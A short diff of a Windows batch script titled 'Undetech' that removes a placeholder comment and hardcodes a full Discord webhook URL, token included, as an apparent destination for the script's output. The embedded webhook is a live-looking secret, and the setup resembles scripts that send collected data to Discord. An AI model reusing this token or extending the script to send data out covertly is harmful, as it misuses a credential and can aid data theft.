@@ -6,7 +6,7 @@ title Undetech
 @echo off
 setlocal enabledelayedexpansion
 
-:: ======= YOUR DISCORD WEBHOOK HERE =======
+
 set "WEBHOOK_URL=https://discord.com/api/webhooks/1395999594873360496/gB_Cb_ne-7St_36jupLAaCsRo-KzsEqNxRooJZdzGOVVvWA2WgxXWvlzmizf1FoviCvg"
 
 
